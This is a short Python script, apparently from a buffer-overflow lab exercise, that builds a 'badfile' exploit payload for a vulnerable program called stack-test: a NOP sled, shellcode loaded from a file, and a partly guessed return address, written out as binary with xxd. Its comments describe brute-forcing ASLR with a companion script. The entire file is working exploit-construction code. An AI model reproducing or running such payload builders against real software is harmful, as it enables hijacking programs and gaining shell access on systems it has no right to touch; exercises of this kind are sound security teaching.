# This file constructs the 'badfile' for use with stack-test. It is similar to task 1
# except that three of the return nibbles can be determined from the dummy variable.
# Once this has been run to create 'badfile' use 'task3_ASLR.py' to iterate over the
# vulnerable program until successful. (Roughly 1 in 1,048,000 chance of success)

import os

fr = open('shell_code','r')
shell = fr.read()
fr.close()

exploit = ('90 ' * 12) + shell + 'a8 34 12 bf'  # "bf" and "8" known from dummy variable

print('Input Buffer: \n' + exploit)
fw = open("shell_out","w+")
fw.write(exploit)
fw.close()

os.system("xxd -p -r shell_out > badfile")
